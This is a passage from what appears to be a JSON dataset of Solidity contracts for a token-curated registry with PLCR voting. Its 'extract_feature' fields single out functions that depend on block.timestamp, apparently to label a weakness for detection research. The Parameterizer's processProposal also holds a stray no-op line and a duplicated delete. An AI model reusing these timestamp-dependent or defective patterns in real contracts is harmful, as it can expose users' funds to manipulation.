set(\"pDispensationPct\", _parameters[9]);\n set(\"voteQuorum\", _parameters[10]);\n set(\"pVoteQuorum\", _parameters[11]);\n }\n function proposeReparameterization(string _name, uint _value) public returns (bytes32) {\n uint deposit = get(\"pMinDeposit\");\n bytes32 propID = keccak256(_name, _value);\n if (keccak256(_name) == keccak256(\"dispensationPct\") ||\n keccak256(_name) == keccak256(\"pDispensationPct\")) {\n require(_value <= 100);\n }\n require(!propExists(propID));\n require(get(_name) != _value);\n proposals[propID] = ParamProposal({\n appExpiry: now.add(get(\"pApplyStageLen\")),\n challengeID: 0,\n deposit: deposit,\n name: _name,\n owner: msg.sender,\n processBy: now.add(get(\"pApplyStageLen\"))\n .add(get(\"pCommitStageLen\"))\n .add(get(\"pRevealStageLen\"))\n .add(PROCESSBY),\n value: _value\n });\n require(token.transferFrom(msg.sender, this, deposit));\n emit _ReparameterizationProposal(_name, _value, propID, deposit, proposals[propID].appExpiry, msg.sender);\n return propID;\n }\n function challengeReparameterization(bytes32 _propID) public returns (uint challengeID) {\n ParamProposal memory prop = proposals[_propID];\n uint deposit = prop.deposit;\n require(propExists(_propID) && prop.challengeID == 0);\n uint pollID = voting.startPoll(\n get(\"pVoteQuorum\"),\n get(\"pCommitStageLen\"),\n get(\"pRevealStageLen\")\n );\n challenges[pollID] = Challenge({\n challenger: msg.sender,\n rewardPool: SafeMath.sub(100, get(\"pDispensationPct\")).mul(deposit).div(100),\n stake: deposit,\n resolved: false,\n winningTokens: 0\n });\n proposals[_propID].challengeID = pollID;\n require(token.transferFrom(msg.sender, this, deposit));\n var (commitEndDate, revealEndDate,) = voting.pollMap(pollID);\n emit _NewChallenge(_propID, pollID, commitEndDate, revealEndDate, msg.sender);\n return pollID;\n }\n function processProposal(bytes32 _propID) public {\n ParamProposal storage prop = proposals[_propID];\n address propOwner = prop.owner;\n uint propDeposit = prop.deposit;\n if (canBeSet(_propID)) {\n set(prop.name, prop.value);\n emit _ProposalAccepted(_propID, prop.name, prop.value);\n delete proposals[_propID];\n require(token.transfer(propOwner, propDeposit));\n } else if (challengeCanBeResolved(_propID)) {\n resolveChallenge(_propID);\n } else if (now > prop.processBy) {\n emit _ProposalExpired(_propID);\n delete proposals[_propID];\n require(token.transfer(propOwner, propDeposit));\n } else {\n revert();\n }\n assert(get(\"dispensationPct\") <= 100);\n assert(get(\"pDispensationPct\") <= 100);\n now.add(get(\"pApplyStageLen\"))\n .add(get(\"pCommitStageLen\"))\n .add(get(\"pRevealStageLen\"))\n .add(PROCESSBY);\n delete proposals[_propID];\n }\n function claimReward(uint _challengeID, uint _salt) public {\n require(challenges[_challengeID].tokenClaims[msg.sender] == false);\n require(challenges[_challengeID].resolved == true);\n uint voterTokens = voting.getNumPassingTokens(msg.sender, _challengeID, _salt);\n uint reward = voterReward(msg.sender, _challengeID, _salt);\n challenges[_challengeID].winningTokens -= voterTokens;\n challenges[_challengeID].rewardPool -= reward;\n challenges[_challengeID].tokenClaims[msg.sender] = true;\n emit _RewardClaimed(_challengeID, reward, msg.sender);\n require(token.transfer(msg.sender, reward));\n }\n function claimRewards(uint[] _challengeIDs, uint[] _salts) public {\n require(_challengeIDs.length == _salts.length);\n for (uint i = 0; i < _challengeIDs.length; i++) {\n claimReward(_challengeIDs[i], _salts[i]);\n }\n }\n function voterReward(address _voter, uint _challengeID, uint _salt)\n public view returns (uint) {\n uint winningTokens = challenges[_challengeID].winningTokens;\n uint rewardPool = challenges[_challengeID].rewardPool;\n uint voterTokens = voting.getNumPassingTokens(_voter, _challengeID, _salt);\n return (voterTokens * rewardPool) / winningTokens;\n }\n function canBeSet(bytes32 _propID) view public returns (bool) {\n ParamProposal memory prop = proposals[_propID];\n return (now > prop.appExpiry && now < prop.processBy && prop.challengeID == 0);\n }\n function propExists(bytes32 _propID) view public returns (bool) {\n return proposals[_propID].processBy > 0;\n }\n function challengeCanBeResolved(bytes32 _propID) view public returns (bool) {\n ParamProposal memory prop = proposals[_propID];\n Challenge memory challenge = challenges[prop.challengeID];\n return (prop.challengeID > 0 && challenge.resolved == false && voting.pollEnded(prop.challengeID));\n }\n function challengeWinnerReward(uint _challengeID) public view returns (uint) {\n if(voting.getTotalNumberOfTokensForWinningOption(_challengeID) == 0) {\n return 2 * challenges[_challengeID].stake;\n }\n return (2 * challenges[_challengeID].stake) - challenges[_challengeID].rewardPool;\n }\n function get(string _name) public view returns (uint value) {\n return params[keccak256(_name)];\n }\n function tokenClaims(uint _challengeID, address _voter) public view returns (bool) {\n return challenges[_challengeID].tokenClaims[_voter];\n }\n function resolveChallenge(bytes32 _propID) private {\n ParamProposal memory prop = proposals[_propID];\n Challenge storage challenge = challenges[prop.challengeID];\n uint reward = challengeWinnerReward(prop.challengeID);\n challenge.winningTokens = voting.getTotalNumberOfTokensForWinningOption(prop.challengeID);\n challenge.resolved = true;\n if (voting.isPassed(prop.challengeID)) {\n if(prop.processBy > now) {\n set(prop.name, prop.value);\n }\n emit _ChallengeFailed(_propID, prop.challengeID, challenge.rewardPool, challenge.winningTokens);\n require(token.transfer(prop.owner, reward));\n }\n else {\n emit _ChallengeSucceeded(_propID, prop.challengeID, challenge.rewardPool, challenge.winningTokens);\n require(token.transfer(challenges[prop.challengeID].challenger, reward));\n }\n }\n function set(string _name, uint _value) private {\n params[keccak256(_name)] = _value;\n }\n}\npragma solidity ^0.4.19;\ncontract ProxyFactory {\n event ProxyDeployed(address proxyAddress, address targetAddress);\n event ProxiesDeployed(address[] proxyAddresses, address targetAddress);\n function createManyProxies(uint256 _count, address _target, bytes _data)\n public\n {\n address[] memory proxyAddresses = new address[](_count);\n for (uint256 i = 0; i < _count; ++i) {\n proxyAddresses[i] = createProxyImpl(_target, _data);\n }\n ProxiesDeployed(proxyAddresses, _target);\n }\n function createProxy(address _target, bytes _data)\n public\n returns (address proxyContract)\n {\n proxyContract = createProxyImpl(_target, _data);\n ProxyDeployed(proxyContract, _target);\n }\n function createProxyImpl(address _target, bytes _data)\n internal\n returns (address proxyContract)\n {\n assembly {\n let contractCode := mload(0x40)\n mstore(add(contractCode, 0x0b), _target)\n mstore(sub(contractCode, 0x09), 0x000000000000000000603160008181600b9039f3600080808080368092803773)\n mstore(add(contractCode, 0x2b), 0x5af43d828181803e808314602f57f35bfd000000000000000000000000000000)\n proxyContract := create(0, contractCode, 60)\n if iszero(extcodesize(proxyContract)) {\n revert(0, 0)\n }\n let dataLength := mload(_data)\n if iszero(iszero(dataLength)) {\n if iszero(call(gas, proxyContract, 0, add(_data, 0x20), dataLength, 0, 0)) {\n revert(0, 0)\n }\n }\n }\n }\n}\npragma solidity ^0.4.8;\ncontract EIP20 is EIP20Interface {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n string public name;\n uint8 public decimals;\n string public symbol;\n function EIP20(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) view public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender)\n view public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract PLCRFactory {\n event newPLCR(address creator, EIP20 token, PLCRVoting plcr);\n ProxyFactory public proxyFactory;\n PLCRVoting public canonizedPLCR;\n constructor() {\n canonizedPLCR = new PLCRVoting();\n proxyFactory = new ProxyFactory();\n }\n function newPLCRBYOToken(EIP20 _token) public returns (PLCRVoting) {\n PLCRVoting plcr = PLCRVoting(proxyFactory.createProxy(canonizedPLCR, \"\"));\n plcr.init(_token);\n emit newPLCR(msg.sender, _token, plcr);\n return plcr;\n }\n function newPLCRWithToken(\n uint _supply,\n string _name,\n uint8 _decimals,\n string _symbol\n ) public returns (PLCRVoting) {\n EIP20 token = new EIP20(_supply, _name, _decimals, _symbol);\n token.transfer(msg.sender, _supply);\n PLCRVoting plcr = PLCRVoting(proxyFactory.createProxy(canonizedPLCR, \"\"));\n plcr.init(token);\n emit newPLCR(msg.sender, token, plcr);\n return plcr;\n }\n}\ncontract ParameterizerFactory {\n event NewParameterizer(address creator, address token, address plcr, Parameterizer parameterizer);\n PLCRFactory public plcrFactory;\n ProxyFactory public proxyFactory;\n Parameterizer public canonizedParameterizer;\n constructor(PLCRFactory _plcrFactory) public {\n plcrFactory = _plcrFactory;\n proxyFactory = plcrFactory.proxyFactory();\n canonizedParameterizer = new Parameterizer();\n }\n function newParameterizerBYOToken(\n EIP20 _token,\n uint[] _parameters\n ) public returns (Parameterizer) {\n PLCRVoting plcr = plcrFactory.newPLCRBYOToken(_token);\n Parameterizer parameterizer = Parameterizer(proxyFactory.createProxy(canonizedParameterizer, \"\"));\n parameterizer.init(\n _token,\n plcr,\n _parameters\n );\n emit NewParameterizer(msg.sender, _token, plcr, parameterizer);\n return parameterizer;\n }\n function newParameterizerWithToken(\n uint _supply,\n string _name,\n uint8 _decimals,\n string _symbol,\n uint[] _parameters\n ) public returns (Parameterizer) {\n PLCRVoting plcr = plcrFactory.newPLCRWithToken(_supply, _name, _decimals, _symbol);\n EIP20 token = EIP20(plcr.token());\n token.transfer(msg.sender, _supply);\n Parameterizer parameterizer = Parameterizer(proxyFactory.createProxy(canonizedParameterizer, \"\"));\n parameterizer.init(\n token,\n plcr,\n _parameters\n );\n emit NewParameterizer(msg.sender, token, plcr, parameterizer);\n return parameterizer;\n }\n}\ncontract Registry {\n event _Application(bytes32 indexed listingHash, uint deposit, uint appEndDate, string data, address indexed applicant);\n event _Challenge(bytes32 indexed listingHash, uint challengeID, string data, uint commitEndDate, uint revealEndDate, address indexed challenger);\n event _Deposit(bytes32 indexed listingHash, uint added, uint newTotal, address indexed owner);\n event _Withdrawal(bytes32 indexed listingHash, uint withdrew, uint newTotal, address indexed owner);\n event _ApplicationWhitelisted(bytes32 indexed listingHash);\n event _ApplicationRemoved(bytes32 indexed listingHash);\n event _ListingRemoved(bytes32 indexed listingHash);\n event _ListingWithdrawn(bytes32 indexed listingHash);\n event _TouchAndRemoved(bytes32 indexed listingHash);\n event _ChallengeFailed(bytes32 indexed listingHash, uint indexed challengeID, uint rewardPool, uint totalTokens);\n event _ChallengeSucceeded(bytes32 indexed listingHash, uint indexed challengeID, uint rewardPool, uint totalTokens);\n event _RewardClaimed(uint indexed challengeID, uint reward, address indexed voter);\n using SafeMath for uint;\n struct Listing {\n uint applicationExpiry;\n bool whitelisted;\n address owner;\n uint unstakedDeposit;\n uint challengeID;\n }\n struct Challenge {\n uint rewardPool;\n address challenger;\n bool resolved;\n uint stake;\n uint totalTokens;\n mapping(address => bool) tokenClaims;\n }\n mapping(uint => Challenge) public challenges;\n mapping(bytes32 => Listing) public listings;\n EIP20Interface public token;\n PLCRVoting public voting;\n Parameterizer public parameterizer;\n string public name;\n function init(address _token, address _voting, address _parameterizer, string _name) public {\n require(_token != 0 && address(token) == 0);\n require(_voting != 0 && address(voting) == 0);\n require(_parameterizer != 0 && address(parameterizer) == 0);\n token = EIP20Interface(_token);\n voting = PLCRVoting(_voting);\n parameterizer = Parameterizer(_parameterizer);\n name = _name;\n }\n function apply(bytes32 _listingHash, uint _amount, string _data) external {\n require(!isWhitelisted(_listingHash));\n require(!appWasMade(_listingHash));\n require(_amount >= parameterizer.get(\"minDeposit\"));\n Listing storage listing = listings[_listingHash];\n listing.owner = msg.sender;\n listing.applicationExpiry = block.timestamp.add(parameterizer.get(\"applyStageLen\"));\n listing.unstakedDeposit = _amount;\n require(token.transferFrom(listing.owner, this, _amount));\n emit _Application(_listingHash, _amount, listing.applicationExpiry, _data, msg.sender);\n }\n function deposit(bytes32 _listingHash, uint _amount) external {\n Listing storage listing = listings[_listingHash];\n require(listing.owner == msg.sender);\n listing.unstakedDeposit += _amount;\n require(token.transferFrom(msg.sender, this, _amount));\n emit _Deposit(_listingHash, _amount, listing.unstakedDeposit, msg.sender);\n }\n function withdraw(bytes32 _listingHash, uint _amount) external {\n Listing storage listing = listings[_listingHash];\n require(listing.owner == msg.sender);\n require(_amount <= listing.unstakedDeposit);\n require(listing.unstakedDeposit - _amount >= parameterizer.get(\"minDeposit\"));\n listing.unstakedDeposit -= _amount;\n require(token.transfer(msg.sender, _amount));\n emit _Withdrawal(_listingHash, _amount, listing.unstakedDeposit, msg.sender);\n }\n function exit(bytes32 _listingHash) external {\n Listing storage listing = listings[_listingHash];\n require(msg.sender == listing.owner);\n require(isWhitelisted(_listingHash));\n require(listing.challengeID == 0 || challenges[listing.challengeID].resolved);\n resetListing(_listingHash);\n emit _ListingWithdrawn(_listingHash);\n }\n function challenge(bytes32 _listingHash, string _data) external returns (uint challengeID) {\n Listing storage listing = listings[_listingHash];\n uint minDeposit = parameterizer.get(\"minDeposit\");\n require(appWasMade(_listingHash) || listing.whitelisted);\n require(listing.challengeID == 0 || challenges[listing.challengeID].resolved);\n if (listing.unstakedDeposit < minDeposit) {\n resetListing(_listingHash);\n emit _TouchAndRemoved(_listingHash);\n return 0;\n }\n uint pollID = voting.startPoll(\n parameterizer.get(\"voteQuorum\"),\n parameterizer.get(\"commitStageLen\"),\n parameterizer.get(\"revealStageLen\")\n );\n uint oneHundred = 100;\n challenges[pollID] = Challenge({\n challenger: msg.sender,\n rewardPool: ((oneHundred.sub(parameterizer.get(\"dispensationPct\"))).mul(minDeposit)).div(100),\n stake: minDeposit,\n resolved: false,\n totalTokens: 0\n });\n listing.challengeID = pollID;\n listing.unstakedDeposit -= minDeposit;\n require(token.transferFrom(msg.sender, this, minDeposit));\n var (commitEndDate, revealEndDate,) = voting.pollMap(pollID);\n emit _Challenge(_listingHash, pollID, _data, commitEndDate, revealEndDate, msg.sender);\n return pollID;\n }\n function updateStatus(bytes32 _listingHash) public {\n if (canBeWhitelisted(_listingHash)) {\n whitelistApplication(_listingHash);\n } else if (challengeCanBeResolved(_listingHash)) {\n resolveChallenge(_listingHash);\n } else {\n revert();\n }\n }\n function updateStatuses(bytes32[] _listingHashes) public {\n for (uint i = 0; i < _listingHashes.length; i++) {\n updateStatus(_listingHashes[i]);\n }\n }\n function claimReward(uint _challengeID, uint _salt) public {\n require(challenges[_challengeID].tokenClaims[msg.sender] == false);\n require(challenges[_challengeID].resolved == true);\n uint voterTokens = voting.getNumPassingTokens(msg.sender, _challengeID, _salt);\n uint reward = voterReward(msg.sender, _challengeID, _salt);\n challenges[_challengeID].totalTokens -= voterTokens;\n challenges[_challengeID].rewardPool -= reward;\n challenges[_challengeID].tokenClaims[msg.sender] = true;\n require(token.transfer(msg.sender, reward));\n emit _RewardClaimed(_challengeID, reward, msg.sender);\n }\n function claimRewards(uint[] _challengeIDs, uint[] _salts) public {\n require(_challengeIDs.length == _salts.length);\n for (uint i = 0; i < _challengeIDs.length; i++) {\n claimReward(_challengeIDs[i], _salts[i]);\n }\n }\n function voterReward(address _voter, uint _challengeID, uint _salt)\n public view returns (uint) {\n uint totalTokens = challenges[_challengeID].totalTokens;\n uint rewardPool = challenges[_challengeID].rewardPool;\n uint voterTokens = voting.getNumPassingTokens(_voter, _challengeID, _salt);\n return (voterTokens * rewardPool) / totalTokens;\n }\n function canBeWhitelisted(bytes32 _listingHash) view public returns (bool) {\n uint challengeID = listings[_listingHash].challengeID;\n if (\n appWasMade(_listingHash) &&\n listings[_listingHash].applicationExpiry < now &&\n !isWhitelisted(_listingHash) &&\n (challengeID == 0 || challenges[challengeID].resolved == true)\n ) { return true; }\n return false;\n }\n function isWhitelisted(bytes32 _listingHash) view public returns (bool whitelisted) {\n return listings[_listingHash].whitelisted;\n }\n function appWasMade(bytes32 _listingHash) view public returns (bool exists) {\n return listings[_listingHash].applicationExpiry > 0;\n }\n function challengeExists(bytes32 _listingHash) view public returns (bool) {\n uint challengeID = listings[_listingHash].challengeID;\n return (listings[_listingHash].challengeID > 0 && !challenges[challengeID].resolved);\n }\n function challengeCanBeResolved(bytes32 _listingHash) view public returns (bool) {\n uint challengeID = listings[_listingHash].challengeID;\n require(challengeExists(_listingHash));\n return voting.pollEnded(challengeID);\n }\n function determineReward(uint _challengeID) public view returns (uint) {\n require(!challenges[_challengeID].resolved && voting.pollEnded(_challengeID));\n if (voting.getTotalNumberOfTokensForWinningOption(_challengeID) == 0) {\n return 2 * challenges[_challengeID].stake;\n }\n return (2 * challenges[_challengeID].stake) - challenges[_challengeID].rewardPool;\n }\n function tokenClaims(uint _challengeID, address _voter) public view returns (bool) {\n return challenges[_challengeID].tokenClaims[_voter];\n }\n function resolveChallenge(bytes32 _listingHash) private {\n uint challengeID = listings[_listingHash].challengeID;\n uint reward = determineReward(challengeID);\n challenges[challengeID].resolved = true;\n challenges[challengeID].totalTokens =\n voting.getTotalNumberOfTokensForWinningOption(challengeID);\n if (voting.isPassed(challengeID)) {\n whitelistApplication(_listingHash);\n listings[_listingHash].unstakedDeposit += reward;\n emit _ChallengeFailed(_listingHash, challengeID, challenges[challengeID].rewardPool, challenges[challengeID].totalTokens);\n }\n else {\n resetListing(_listingHash);\n require(token.transfer(challenges[challengeID].challenger, reward));\n emit _ChallengeSucceeded(_listingHash, challengeID, challenges[challengeID].rewardPool, challenges[challengeID].totalTokens);\n }\n }\n function whitelistApplication(bytes32 _listingHash) private {\n if (!listings[_listingHash].whitelisted) { emit _ApplicationWhitelisted(_listingHash); }\n listings[_listingHash].whitelisted = true;\n }\n function resetListing(bytes32 _listingHash) private {\n Listing storage listing = listings[_listingHash];\n if (listing.whitelisted) {\n emit _ListingRemoved(_listingHash);\n } else {\n emit _ApplicationRemoved(_listingHash);\n }\n address owner = listing.owner;\n uint unstakedDeposit = listing.unstakedDeposit;\n delete listings[_listingHash];\n if (unstakedDeposit > 0){\n require(token.transfer(owner, unstakedDeposit));\n }\n }\n}\ncontract RegistryFactory {\n event NewRegistry(address creator, EIP20 token, PLCRVoting plcr, Parameterizer parameterizer, Registry registry);\n ParameterizerFactory public parameterizerFactory;\n ProxyFactory public proxyFactory;\n Registry public canonizedRegistry;\n constructor(ParameterizerFactory _parameterizerFactory) public {\n parameterizerFactory = _parameterizerFactory;\n proxyFactory = parameterizerFactory.proxyFactory();\n canonizedRegistry = new Registry();\n }\n function newRegistryBYOToken(\n EIP20 _token,\n uint[] _parameters,\n string _name\n ) public returns (Registry) {\n Parameterizer parameterizer = parameterizerFactory.newParameterizerBYOToken(_token, _parameters);\n PLCRVoting plcr = parameterizer.voting();\n Registry registry = Registry(proxyFactory.createProxy(canonizedRegistry, \"\"));\n registry.init(_token, plcr, parameterizer, _name);\n emit NewRegistry(msg.sender, _token, plcr, parameterizer, registry);\n return registry;\n }\n function newRegistryWithToken(\n uint _supply,\n string _tokenName,\n uint8 _decimals,\n string _symbol,\n uint[] _parameters,\n string _registryName\n ) public returns (Registry) {\n Parameterizer parameterizer = parameterizerFactory.newParameterizerWithToken(_supply, _tokenName, _decimals, _symbol, _parameters);\n EIP20 token = EIP20(parameterizer.token());\n token.transfer(msg.sender, _supply);\n PLCRVoting plcr = parameterizer.voting();\n Registry registry = Registry(proxyFactory.createProxy(canonizedRegistry, \"\"));\n registry.init(token, plcr, parameterizer, _registryName);\n emit NewRegistry(msg.sender, token, plcr, parameterizer, registry);\n return registry;\n }\n}",
  "extract_feature": [
    "function startPoll(uint _voteQuorum, uint _commitDuration, uint _revealDuration) public returns (uint pollID) {\npollNonce = pollNonce + 1;\nuint commitEndDate = block.timestamp.add(_commitDuration);\nuint revealEndDate = commitEndDate.add(_revealDuration);\npollMap[pollNonce] = Poll({\nvoteQuorum: _voteQuorum,\ncommitEndDate: commitEndDate,\nrevealEndDate: revealEndDate,\nvotesFor: 0,\nvotesAgainst: 0\n});\nemit _PollCreated(_voteQuorum, commitEndDate, revealEndDate, pollNonce, msg.sender);\nreturn pollNonce;\n}",
    "function isExpired(uint _terminationDate) constant public returns (bool expired) {\nreturn (block.timestamp > _terminationDate);\n}",
    "function apply(bytes32 _listingHash, uint _amount, string _data) external {\nrequire(!isWhitelisted(_listingHash));\nrequire(!appWasMade(_listingHash));\nrequire(_amount >= parameterizer.get(\"minDeposit\"));\nListing storage listing = listings[_listingHash];\nlisting.owner = msg.sender;\nlisting.applicationExpiry = block.timestamp.add(parameterizer.get(\"applyStageLen\"));\nlisting.unstakedDeposit = _amount;\nrequire(token.transferFrom(listing.owner, this, _amount));\nemit _Application(_listingHash, _amount, listing.applicationExpiry, _data, msg.sender);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f9e"
  },
  "filename": "9851.sol",
  "content": "pragma solidity ^0.4.20;\npragma solidity^0.4.11;\nlibrary AttributeStore {\n struct Data {\n mapping(bytes32 => uint) store;\n }\n function getAttribute(Data storage self, bytes32 _UUID, string _attrName)\n public view returns (uint) {\n bytes32 key = keccak256(_UUID, _attrName);\n return self.store[key];\n }\n function setAttribute(Data storage self, bytes32 _UUID, string _attrName, uint _attrVal)\n public {\n bytes32 key = keccak256(_UUID, _attrName);\n self.store[key] = _attrVal;\n }\n}\npragma solidity^0.4.11;\nlibrary DLL {\n uint constant NULL_NODE_ID = 0;\n struct Node {\n uint next;\n uint prev;\n }\n struct Data {\n mapping(uint => Node) dll;\n }\n function isEmpty(Data storage self) public view returns (bool) {\n return getStart(self) == NULL_NODE_ID;\n }\n function contains(Data storage self, uint _curr) public view returns (bool) {\n if (isEmpty(self) || _curr == NULL_NODE_ID) {\n return false;\n }\n bool isSingleNode = (getStart(self) == _curr) && (getEnd(self) == _curr);\n bool isNullNode = (getNext(self, _curr) == NULL_NODE_ID) && (getPrev(self, _curr) == NULL_NODE_ID);\n return isSingleNode || !isNullNode;\n }\n function getNext(Data storage self, uint _curr) public view returns (uint) {\n return self.dll[_curr].next;\n }\n function getPrev(Data storage self, uint _curr) public view returns (uint) {\n return self.dll[_curr].prev;\n }\n function getStart(Data storage self) public view returns (uint) {\n return getNext(self, NULL_NODE_ID);\n }\n function getEnd(Data storage self) public view returns (uint) {\n return getPrev(self, NULL_NODE_ID);\n }\n function insert(Data storage self, uint _prev, uint _curr, uint _next) public {\n require(_curr != NULL_NODE_ID);\n remove(self, _curr);\n require(_prev == NULL_NODE_ID || contains(self, _prev));\n require(_next == NULL_NODE_ID || contains(self, _next));\n require(getNext(self, _prev) == _next);\n require(getPrev(self, _next) == _prev);\n self.dll[_curr].prev = _prev;\n self.dll[_curr].next = _next;\n self.dll[_prev].next = _curr;\n self.dll[_next].prev = _curr;\n }\n function remove(Data storage self, uint _curr) public {\n if (!contains(self, _curr)) {\n return;\n }\n uint next = getNext(self, _curr);\n uint prev = getPrev(self, _curr);\n self.dll[next].prev = prev;\n self.dll[prev].next = next;\n delete self.dll[_curr];\n }\n}\npragma solidity ^0.4.8;\ncontract EIP20Interface {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract PLCRVoting {\n event _VoteCommitted(uint indexed pollID, uint numTokens, address indexed voter);\n event _VoteRevealed(uint indexed pollID, uint numTokens, uint votesFor, uint votesAgainst, uint indexed choice, address indexed voter);\n event _PollCreated(uint voteQuorum, uint commitEndDate, uint revealEndDate, uint indexed pollID, address indexed creator);\n event _VotingRightsGranted(uint numTokens, address indexed voter);\n event _VotingRightsWithdrawn(uint numTokens, address indexed voter);\n event _TokensRescued(uint indexed pollID, address indexed voter);\n using AttributeStore for AttributeStore.Data;\n using DLL for DLL.Data;\n using SafeMath for uint;\n struct Poll {\n uint commitEndDate;\n uint revealEndDate;\n uint voteQuorum;\n uint votesFor;\n uint votesAgainst;\n mapping(address => bool) didCommit;\n mapping(address => bool) didReveal;\n }\n uint constant public INITIAL_POLL_NONCE = 0;\n uint public pollNonce;\n mapping(uint => Poll) public pollMap;\n mapping(address => uint) public voteTokenBalance;\n mapping(address => DLL.Data) dllMap;\n AttributeStore.Data store;\n EIP20Interface public token;\n function init(address _token) public {\n require(_token != 0 && address(token) == 0);\n token = EIP20Interface(_token);\n pollNonce = INITIAL_POLL_NONCE;\n }\n function requestVotingRights(uint _numTokens) public {\n require(token.balanceOf(msg.sender) >= _numTokens);\n voteTokenBalance[msg.sender] += _numTokens;\n require(token.transferFrom(msg.sender, this, _numTokens));\n emit _VotingRightsGranted(_numTokens, msg.sender);\n }\n function withdrawVotingRights(uint _numTokens) external {\n uint availableTokens = voteTokenBalance[msg.sender].sub(getLockedTokens(msg.sender));\n require(availableTokens >= _numTokens);\n voteTokenBalance[msg.sender] -= _numTokens;\n require(token.transfer(msg.sender, _numTokens));\n emit _VotingRightsWithdrawn(_numTokens, msg.sender);\n }\n function rescueTokens(uint _pollID) public {\n require(isExpired(pollMap[_pollID].revealEndDate));\n require(dllMap[msg.sender].contains(_pollID));\n dllMap[msg.sender].remove(_pollID);\n emit _TokensRescued(_pollID, msg.sender);\n }\n function rescueTokensInMultiplePolls(uint[] _pollIDs) public {\n for (uint i = 0; i < _pollIDs.length; i++) {\n rescueTokens(_pollIDs[i]);\n }\n }\n function commitVote(uint _pollID, bytes32 _secretHash, uint _numTokens, uint _prevPollID) public {\n require(commitPeriodActive(_pollID));\n if (voteTokenBalance[msg.sender] < _numTokens) {\n uint remainder = _numTokens.sub(voteTokenBalance[msg.sender]);\n requestVotingRights(remainder);\n }\n require(voteTokenBalance[msg.sender] >= _numTokens);\n require(_pollID != 0);\n require(_secretHash != 0);\n require(_prevPollID == 0 || dllMap[msg.sender].contains(_prevPollID));\n uint nextPollID = dllMap[msg.sender].getNext(_prevPollID);\n if (nextPollID == _pollID) {\n nextPollID = dllMap[msg.sender].getNext(_pollID);\n }\n require(validPosition(_prevPollID, nextPollID, msg.sender, _numTokens));\n dllMap[msg.sender].insert(_prevPollID, _pollID, nextPollID);\n bytes32 UUID = attrUUID(msg.sender, _pollID);\n store.setAttribute(UUID, \"numTokens\", _numTokens);\n store.setAttribute(UUID, \"commitHash\", uint(_secretHash));\n pollMap[_pollID].didCommit[msg.sender] = true;\n emit _VoteCommitted(_pollID, _numTokens, msg.sender);\n }\n function commitVotes(uint[] _pollIDs, bytes32[] _secretHashes, uint[] _numsTokens, uint[] _prevPollIDs) external {\n require(_pollIDs.length == _secretHashes.length);\n require(_pollIDs.length == _numsTokens.length);\n require(_pollIDs.length == _prevPollIDs.length);\n for (uint i = 0; i < _pollIDs.length; i++) {\n commitVote(_pollIDs[i], _secretHashes[i], _numsTokens[i], _prevPollIDs[i]);\n }\n }\n function validPosition(uint _prevID, uint _nextID, address _voter, uint _numTokens) public constant returns (bool valid) {\n bool prevValid = (_numTokens >= getNumTokens(_voter, _prevID));\n bool nextValid = (_numTokens <= getNumTokens(_voter, _nextID) || _nextID == 0);\n return prevValid && nextValid;\n }\n function revealVote(uint _pollID, uint _voteOption, uint _salt) public {\n require(revealPeriodActive(_pollID));\n require(pollMap[_pollID].didCommit[msg.sender]);\n require(!pollMap[_pollID].didReveal[msg.sender]);\n require(keccak256(_voteOption, _salt) == getCommitHash(msg.sender, _pollID));\n uint numTokens = getNumTokens(msg.sender, _pollID);\n if (_voteOption == 1) {\n pollMap[_pollID].votesFor += numTokens;\n } else {\n pollMap[_pollID].votesAgainst += numTokens;\n }\n dllMap[msg.sender].remove(_pollID);\n pollMap[_pollID].didReveal[msg.sender] = true;\n emit _VoteRevealed(_pollID, numTokens, pollMap[_pollID].votesFor, pollMap[_pollID].votesAgainst, _voteOption, msg.sender);\n }\n function revealVotes(uint[] _pollIDs, uint[] _voteOptions, uint[] _salts) external {\n require(_pollIDs.length == _voteOptions.length);\n require(_pollIDs.length == _salts.length);\n for (uint i = 0; i < _pollIDs.length; i++) {\n revealVote(_pollIDs[i], _voteOptions[i], _salts[i]);\n }\n }\n function getNumPassingTokens(address _voter, uint _pollID, uint _salt) public constant returns (uint correctVotes) {\n require(pollEnded(_pollID));\n require(pollMap[_pollID].didReveal[_voter]);\n uint winningChoice = isPassed(_pollID) ? 1 : 0;\n bytes32 winnerHash = keccak256(winningChoice, _salt);\n bytes32 commitHash = getCommitHash(_voter, _pollID);\n require(winnerHash == commitHash);\n return getNumTokens(_voter, _pollID);\n }\n function startPoll(uint _voteQuorum, uint _commitDuration, uint _revealDuration) public returns (uint pollID) 